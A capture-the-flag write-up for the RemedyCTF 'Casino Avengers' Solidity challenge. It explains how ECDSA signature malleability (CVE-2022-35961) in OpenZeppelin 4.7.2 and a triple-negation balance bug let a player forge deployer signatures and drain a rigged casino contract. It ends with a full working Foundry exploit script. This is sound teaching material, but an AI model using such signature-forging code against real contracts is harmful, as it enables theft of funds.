# Casino Avengers

> [!NOTE]  
> \[🟢]&ensp;**EASY**:&emsp;`30` solves

<br />

"Casino Avengers" was an **easy**-difficulty challenge released at the beginning of the **RemedyCTF**. It was one of the tasks related to the `Solidity` category. Its description tells participants to crack a _rigged Casino smart contract_ to retrieve _funds locked in the contract_.

<br />

> After numerous attacks by Alice on Bob, he's now planning his revenge. By tracing his stolen funds, Bob has uncovered Alice's latest scheme: a rigged Casino smart contract.<br/><br/>
> You and Bob have a long history together. While Bob may not be an expert in hacking, he has turned to his most trusted ally - you - for assistance. Although the funds are already locked in the contract and it seems impossible to retrieve them, as a team you are determined to find a way...

<br />

## 📑&ensp;TLDR

Due to ECDSA signature malleability ([`CVE-2022-35961`](https://nvd.nist.gov/vuln/detail/CVE-2022-35961)) present in the `4.7.2` version of `@openzeppelin/contracts` used in the task, it is possible to forge new signatures based on the original ones in order to call functions that require successful signature verification.<br /><br />Since `reset` function implements an "optimization trick", a line `uint256 balance = ~~~balances[holder];`, which is vulnerable to Integer Overflow, one can make their balance as high as `uint256(int256(-99.9 ether - 1 wei))`, forge a signature and call `reset` to solve the task.

<br />

## 🔍&ensp;Analysis

### What is the goal? 📍

By analyzing the `isSolved` function of the `Challenge.sol` file, we can find out the conditions needed to get the flag:
```solidity
function isSolved() external view returns (bool) {
    return address(PLAYER).balance >= 99 ether
        && address(CASINO).balance == 0;
}
```

> [!IMPORTANT]  
> The main goal throughout the task is to **drain the `CASINO` balance** and **make the `PLAYER` balance greater than or equal to `99` ether**.

<br />

### What is going on? ⚙️

The `Casino` contract consists of:
- Modifiers:&ensp;`whenNotPaused`
- External functions:&ensp;`availablePool`, `receive`, `deposit`, `withdraw`, `bet`
- Internal functions:&ensp;`_deposit`, `_withdraw`, `_verifySignature`
- "Management" functions (external, but require signature verification):&ensp;`pause`, `reset`

<br/>

The player who calls `bet` must have some funds deposited into the `Casino` in order to place bets:
```solidity
contract Casino is ICasino {
    /// @notice Allows a user to place a bet with a specified amount
    /// @param amount The amount of ETH to bet
    /// @dev The user must have sufficient balance to place the bet
    /// @dev The outcome is determined by a true random number generation
    /// @dev Emits a Bet event with the result
    function bet(uint256 amount) external returns (bool) {
        if (balances[msg.sender] < amount) revert InvalidAmount();

        ...
    }
...
}
...
```

External `deposit` and `withdraw` functions call internal `_deposit` and `_withdraw` functions respectively, both of which have `whenNotPaused` modifiers and require `Casino` to not be paused when called:
```solidity
contract Casino is ICasino {
    /** MODIFIERS */
    modifier whenNotPaused {
        if (paused) revert Paused();
        _;
    }

    ...

    /// @notice Allows a user to deposit ETH into the casino for a specified receiver
    /// @param receiver The address that will receive the deposited amount in their balance
    /// @dev This function calls the internal _deposit function
    /// @dev The deposited amount must be at least 0.1 ETH
    /// @dev The contract must not be paused
    /// @dev Emits a Deposit event
    function deposit(address receiver) external payable {
        _deposit(msg.sender, receiver, msg.value);
    }
    
    /// @notice Allows a user to withdraw ETH from the casino for a specified receiver
    /// @param receiver The address that will receive the withdrawn amount in their balance
    /// @param amount The amount of ETH to withdraw
    /// @dev This function calls the internal _withdraw function
    /// @dev The contract must not be paused
    /// @dev Emits a Withdraw event
    function withdraw(address receiver, uint256 amount) external {
        _withdraw(msg.sender, receiver, amount);
    }

    ...

        /** INTERNAL */
    function _deposit(address depositor, address receiver, uint256 amount) internal whenNotPaused {
        ...
    }

    function _withdraw(address withdrawer, address receiver, uint256 amount) internal whenNotPaused {
        ...
    }
...
}
...
```

However, when the Challenge is deployed, the `pause` function is called and `Casino` gets paused, so players can not `deposit` or `withdraw` by default:
```solidity
contract Deploy is CTFDeployer {
    function deploy(address system, address player) internal override returns (address challenge) {
        vm.startBroadcast(system);
        
        ...

        uint systemPK = vm.deriveKey(vm.envString("MNEMONIC"), 1);
        bytes32 salt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(systemPK, keccak256(abi.encode(0, salt)));
        casino.pause(
            abi.encodePacked(r, s, v),
            salt
        );

        ...

        vm.stopBroadcast();
    }
}
```

Moreover, they can not call `pause` to unpause the `Casino` on their own, because `pause` requires the signature passed by the caller to pass the signature verification process within the internal `_verifySignature` function:
```solidity
contract Casino is ICasino {
...
    /** MANAGEMENT */
    function pause(
        bytes memory signature,
        bytes32 salt
    ) external {
        _verifySignature(signature, abi.encode(0, salt));
        paused = !paused;
    }
...
}
```

<br/>

### What is the potential attack vector? 🗡

#### ECDSA signature malleability 🔑

The signature verification process implemented within the internal `_verifySignature` function involves **ECDSA** signature recovery:
```solidity
...
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
...

contract Casino is ICasino {
...
    function _verifySignature(bytes memory signature, bytes memory digest) internal {
        if (nullifiers[signature]) revert SignatureAlreadyUsed();

        address signatureSigner = ECDSA.recover(keccak256(digest), signature);
        if (signatureSigner != signer) revert InvalidSignature();

        nullifiers[signature] = true;
    }
...
}
```

Luckily, the task uses version `4.7.2` of `@openzeppelin/contracts`, vulnerable to **ECDSA signature malleability** ([`CVE-2022-35961`](https://nvd.nist.gov/vuln/detail/CVE-2022-35961)). Here is the `package.json` entry that players can find in `lib/openzeppelin-contracts` in the task `project` files:

```json
{
  "name": "openzeppelin-solidity",
  "description": "Secure Smart Contract library for Solidity",
  "version": "4.7.2",
  "files": [
    "/contracts/**/*.sol",
    "/build/contracts/*.json",
    "!/contracts/mocks/**/*"
  ],
  ...
}
```

> **ECDSA signature malleability** makes it possible to forge new signatures based on the original ones:
> - \[ :octocat: \]&emsp;**Security Issue**:&ensp;‟ECDSA signature malleability” by frangio&ensp;[🔗](https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-4h98-2769-gh6h)
> - \[ :octocat: \]&emsp;**Pull Request**:&ensp;‟Fix ECDSA signature malleability” by frangio&ensp;[🔗](https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3610/files)

<br/>

During the deployment process, both `pause` and `reset` functions, which are "management" functions that require signature verification, are called by the deployer: you can see values of `salt` within the `deploy` function included within the task files. One can also retrieve original signatures that belong to the deployer from the transactions created during the deployment, e.g. with the use of `chisel`.
```solidity
contract Deploy is CTFDeployer {
    function deploy(address system, address player) internal override returns (address challenge) {
        vm.startBroadcast(system);

        ...

        uint systemPK = vm.deriveKey(vm.envString("MNEMONIC"), 1);
        bytes32 salt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(systemPK, keccak256(abi.encode(0, salt)));
        casino.pause(
            abi.encodePacked(r, s, v),
            salt
        );

        salt = 0x7867dc2b606f63c4ad88af7e48c7b934255163b45fb275880b4b451fa5d25e1b;
        (v, r, s) = vm.sign(systemPK, keccak256(abi.encode(1, system, 1 ether, salt)));
        casino.reset(
            abi.encodePacked(r, s, v),
            payable(system),
            1 ether,
            salt
        );

        vm.stopBroadcast();
    }
}
```

Even though it is possible to forge a signature to call the `reset` function, the forged signature must be based on the original signature used by the deployer to execute the `reset` during the deployment process, and thus the forged signature can only be used to sign the exact same function call with the exact same values of the arguments as specified in the original call.

So this far the `Casino`'s vulnerability to the **ECDSA signature malleability** can only be exploited to execute `pause(abi.encodePacked(r, s, v), salt);` and pause / unpause the `Casino` OR to execute `reset(abi.encodePacked(r, s, v), payable(system), 1 ether, salt);`.

<br/>

#### Improper bit manipulation 🧮

One may notice the "optimization trick" present within the `reset` function:&ensp;`balance = ~~~balances[holder]`. For each holder, it performs a _triple bitwise negation_ on their local balance, nullifies their balance and then sends out the amount calculated on the first step.

For example:
1. Someone executes `reset` to reset the `Casino`.
2. Holder has `1 ether` on their balance within the `Casino`:
    > `1 ether` = `1000000000000000000 wei` = `0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000110111100000101101101011001110100111011001000000000000000000`&ensp;(`uint256` = 256 bits);
3. Triple bitwise negation happens:
    > `balance = ~~~1 ether` → `balance = ~~~1000000000000000000 wei` → `balance = ~1000000000000000000 wei` → `balance = ~0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000110111100000101101101011001110100111011001000000000000000000` → `balance = 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111001000011111010010010100110001011000100110111111111111111111` → `balance = 115792089237316195423570985008687907853269984665640564039456584007913129639935 wei`;
4. `Casino` does not have this much, so the call gets reverted.
```solidity
contract Casino is ICasino {
...
    function reset(
        bytes memory signature,
        address payable receiver,
        uint256 amount,
        bytes32 salt
    ) external {
        _verifySignature(signature, abi.encode(1, receiver, amount, salt));

        totalBets = 0;

        // it's an honest contract
        // give money back to the holders
        uint256 holderslen = holders.length;
        for (uint256 h = 0; h < holderslen; h++) {
            address holder = holders[h];
            uint256 balance = ~~~balances[holder]; // optimization trick

            balances[holder] = 0;

            holder.call{value: balance}("");
        }

        receiver.call{value: amount}("");
    }
...
}
```

<br />

## 🔓&ensp;Solution

### ECDSA signature malleability 🔑

[`CVE-2022-35961`](https://nvd.nist.gov/vuln/detail/CVE-2022-35961), **ECDSA signature malleability**, makes it possible to forge new signatures based on the original ones:
> - \[ :octocat: \]&emsp;**Security Issue**:&ensp;‟ECDSA signature malleability” by frangio&ensp;[🔗](https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-4h98-2769-gh6h)
> - \[ :octocat: \]&emsp;**Pull Request**:&ensp;‟Fix ECDSA signature malleability” by frangio&ensp;[🔗](https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3610/files)

<br/>

The functions `ECDSA.recover` and `ECDSA.tryRecover` are vulnerable to this signature malleability due to accepting `EIP-2098` compact signatures in addition to the traditional 65 byte signature format. 

The `_verifySignature` function implemented in the `Casino` uses the `ECDSA.recover` function to do the ECDSA signature recovery:
```solidity
...
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
...

contract Casino is ICasino {
...
    function _verifySignature(bytes memory signature, bytes memory digest) internal {
        if (nullifiers[signature]) revert SignatureAlreadyUsed();

        address signatureSigner = ECDSA.recover(keccak256(digest), signature);
        if (signatureSigner != signer) revert InvalidSignature();

        nullifiers[signature] = true;
    }
...
}
```

<br/>

In order to exploit the **ECDSA signature malleability**, one can disassemble any **original** signatures found in the transactions generated during the **deployment** process to extract their `r`, `s`, `v` values and create brand new `EIP-2098` compact signatures.

Have a look at the [`to2098Format`](https://github.com/frangio/openzeppelin-contracts/blob/312609159161d7f6367ee982c685aaeead25a372/test/utils/cryptography/ECDSA.test.js#L12-L23) function implementation that can be found in the `openzeppelin-contracts/test/utils/cryptography/ECDSA.test.js` to better understand the conversion process:
```solidity
function to2098Format (signature) {
    const long = web3.utils.hexToBytes(signature);
    if (long.length !== 65) {
        throw new Error('invalid signature length (expected long format)');
    }
    if (long[32] >> 7 === 1) {
        throw new Error('invalid signature \'s\' value');
    }
    const short = long.slice(0, 64);
    short[32] |= (long[64] % 27) << 7; // set the first bit of the 32nd byte to the v parity bit
    return web3.utils.bytesToHex(short);
}
```

<br/>

Our `malleability` function performs steps similar to the [`to2098Format`](https://github.com/frangio/openzeppelin-contracts/blob/312609159161d7f6367ee982c685aaeead25a372/test/utils/cryptography/ECDSA.test.js#L12-L23) function mentioned above:
1. Requires the original signature:&emsp;`bytes memory signature`.
2. Extracts the `r`, `s`, `v` values from the original signature.
3. Sets the first bit of the 32nd byte to the `v` parity bit:&emsp;`s |= bytes32((uint256(v) % 27) << 255);`.
4. Returns the generated `EIP-2098` compact signatures based on the original signature.
```solidity
...
contract Attack {
    ...
    function malleability(bytes memory signature) internal pure returns(bytes memory) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        s |= bytes32((uint256(v) % 27) << 255);
        return abi.encodePacked(r, s);
    }
    ...
}
```

<br/>

And this is how the `malleability` function can be used to forge signatures to "replay" `pause(abi.encodePacked(r, s, v), salt);` to pause / unpause the `Casino` and `reset(abi.encodePacked(r, s, v), payable(system), 1 ether, salt);` executed during the challenge deployment. The hexadecimal values you see are the salt values used by the original deployer:

```solidity
...
contract Attack {
    ...

    function attack() external payable {
        ...
        bytes memory origSignature = hex"<ORIGINAL DEPLOYER SIGNATURE FOR PAUSE>";
        bytes memory newSignature = malleability(origSignature);
        console.logBytes(newSignature);

        casino.pause(newSignature, 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a);
        ...

        origSignature = hex"<ORIGINAL DEPLOYER SIGNATURE FOR RESET>";
        newSignature = malleability(origSignature);
        
        casino.reset(newSignature, payable(<ORIGINAL SYSTEM ADDRESS FROM SIGNATURE>), 1 ether, 0x7867dc2b606f63c4ad88af7e48c7b934255163b45fb275880b4b451fa5d25e1b);
        ...
    }
    ...
}
...
```

<br/>

### Improper bit manipulation 🧮

To solve the task, the player must make the `Casino` pay. To make the `Casino` transfer all of its funds (`100 ether` deposited at the beginning of the deployment process) to the player, one can exploit the "optimization trick". Imagine the following scenario:
1. The malicious player executes `reset` to reset the `Casino`.
2. The malicious player has `uint256(int256(-99.9 ether - 1 wei))` on their balance within the `Casino`:
    > `uint256(int256(-99.9 ether - 1 wei))` = `uint256(-99900000000000000001 wei)` = `115792089237316195423570985008687907853269984665640564039357684007913129639935 wei` = `1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110101001010110011011111001110100101011111010011110011111111111111111`;
3. Triple bitwise negation happens:
    > `balance = ~~~uint256(int256(-99.9 ether - 1 wei))` → `balance = ~~~uint256(-99900000000000000001 wei)` → `balance = ~115792089237316195423570985008687907853269984665640564039357684007913129639935 wei` → `balance = ~1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110101001010110011011111001110100101011111010011110011111111111111111` → `balance = 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010110101001100100000110001011010100000101100001100000000000000000` → `balance = 99900000000000000000 wei` → `balance = 99.9 ether`;
4. `Casino` has this amount of ether, and the malicious player, as a holder, receives the funds upon `reset`.

<br/>

To earn `115792089237316195423570985008687907853269984665640564039357684007913129639935 wei` required in order to exploit this bit manipulation trick, placing bets by calling the `bet` function in a `while` loop turned out to be just enough:
```solidity
...
contract Attack {
    ...

    function attack() external payable {
        ...
        uint256 targetBalance = uint256(int256(-99.9 ether - 1 wei));
        console.log("Target balance:\t", targetBalance);
        
        while (casino.balances(address(this)) < targetBalance) {
            uint256 random = uint256(keccak256(abi.encode(49_479, block.number, casino.totalBets())));
            if (random % 2 != 1) {
                casino.bet{gas: 50_000}(0);
                continue;
            }

            uint256 bet = casino.balances(address(this));
            if (bet > targetBalance - bet) { bet = targetBalance - bet; }
            casino.bet{gas: 50_000}(bet);

            console.log("============ BET ===============");
            console.log("PLAYER funds:\t", casino.balances(address(this)) / 1e18);
            console.log("CASINO funds:\t", address(challenge.CASINO()).balance / 1e18);
        }
        ...
    }
    ...
}
...
```

<br/>

### Exploitation ⚠️

> `[+]` Have a look at the full script:&ensp;[`Solve.s.sol`](./Solve.s.sol) <br />
> `[*]` Execute the script with this command:
> ```bash
> forge script -f '{CTF_RPC_URL}' --broadcast ./script/Solve.s.sol
> ```
<br />

```solidity
pragma solidity 0.8.28;

import "../src/Challenge.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "forge-std/Script.sol";

contract Attack {
    Challenge private challenge;
    Casino private casino;

    constructor(Challenge _challenge, Casino _casino) public payable {
        challenge = _challenge;
        casino = _casino;
    }

    function malleability(bytes memory signature) internal pure returns(bytes memory) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        s |= bytes32((uint256(v) % 27) << 255);
        return abi.encodePacked(r, s);
    }

    receive() external payable {
        console.log("Received:\t", msg.value);
    }

    function attack() external payable {
        console.log("============ INITIAL STATE ===============");
        console.log("PLAYER funds:\t", address(challenge.PLAYER()).balance / 1e18);
        console.log("CASINO funds:\t", address(challenge.CASINO()).balance / 1e18);

        bytes memory origSignature = hex"<ORIGINAL DEPLOYER SIGNATURE FOR PAUSE>";
        bytes memory newSignature = malleability(origSignature);
        console.logBytes(newSignature);

        casino.pause(newSignature, 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a);
        casino.deposit{value: 0.9 ether}(address(this));

        console.log("============ DEPOSIT ===============");
        console.log("PLAYER funds:\t", casino.balances(address(this)) / 1e18);
        console.log("CASINO funds:\t", address(challenge.CASINO()).balance / 1e18);

        uint256 targetBalance = uint256(int256(-99.9 ether - 1 wei));
        console.log("Target balance:\t", targetBalance);
        
        while (casino.balances(address(this)) < targetBalance) {
            uint256 random = uint256(keccak256(abi.encode(49_479, block.number, casino.totalBets())));
            if (random % 2 != 1) {
                casino.bet{gas: 50_000}(0);
                continue;
            }

            uint256 bet = casino.balances(address(this));
            if (bet > targetBalance - bet) { bet = targetBalance - bet; }
            casino.bet{gas: 50_000}(bet);

            console.log("============ BET ===============");
            console.log("PLAYER funds:\t", casino.balances(address(this)) / 1e18);
            console.log("CASINO funds:\t", address(challenge.CASINO()).balance / 1e18);
        }

        origSignature = hex"<ORIGINAL DEPLOYER SIGNATURE FOR RESET>";
        newSignature = malleability(origSignature);
        casino.reset(newSignature, payable(<ORIGINAL SYSTEM ADDRESS FROM SIGNATURE>), 1 ether, 0x7867dc2b606f63c4ad88af7e48c7b934255163b45fb275880b4b451fa5d25e1b);
        
        console.log("============ RESET ===============");
        console.log("PLAYER funds:\t", address(challenge.PLAYER()).balance / 1e18);
        console.log("CASINO funds:\t", address(challenge.CASINO()).balance / 1e18);
    }
}

contract Solution is Script {
    Challenge public challenge = Challenge(<CHALLENGE_ADDRESS>);
    Casino public casino = Casino(challenge.CASINO());

    function run() external{
        vm.startBroadcast(<PLAYER_ADDRESS>);
        new Attack{value: 0.9 ether}(challenge, casino).attack();
        vm.stopBroadcast();

        console.log("address(PLAYER).balance", address(challenge.PLAYER()).balance);
        console.log("address(CASINO).balance", address(challenge.CASINO()).balance);

        require(challenge.isSolved(), "Not solved!");
    }
}
```

<br />

## 📑 See also
- \[ :octocat: \]&emsp;**Security Issue**:&ensp;‟ECDSA signature malleability” by frangio&ensp;[🔗](https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-4h98-2769-gh6h)
- \[ :octocat: \]&emsp;**Pull Request**:&ensp;‟Fix ECDSA signature malleability” by frangio&ensp;[🔗](https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3610/files)
- \[ 📕 \]&emsp;**CVE**:&ensp;‟`CVE-2022-35961`” by National Vulnerability Database&ensp;[🔗](https://nvd.nist.gov/vuln/detail/CVE-2022-35961)